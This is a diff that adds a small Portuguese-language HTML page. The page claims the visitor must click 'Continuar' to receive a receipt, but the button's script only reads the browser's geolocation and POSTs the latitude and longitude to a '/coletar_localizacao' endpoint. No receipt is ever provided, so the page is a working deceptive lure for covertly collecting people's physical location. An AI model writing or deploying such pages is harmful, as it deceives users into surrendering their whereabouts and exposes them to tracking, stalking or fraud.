@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Confirmação</title>
+</head>
+<body>
+    <h2>Por favor, clique em continuar para receber o comprovante</h2>
+    <p>.</p>
+    <button onclick="coletarLocalizacao()">Continuar</button>
+
+    <script>
+        function coletarLocalizacao() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        fetch('/coletar_localizacao', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            alert("Obrigado!.");
+                        });
+                    },
+                    function(error) {
+                        alert("Não foi possível: " + error.message);
+                    }
+                );
+            } else {
+                alert("tente novamente.");
+            }
+        }
+    </script>
+</body>
+</html>
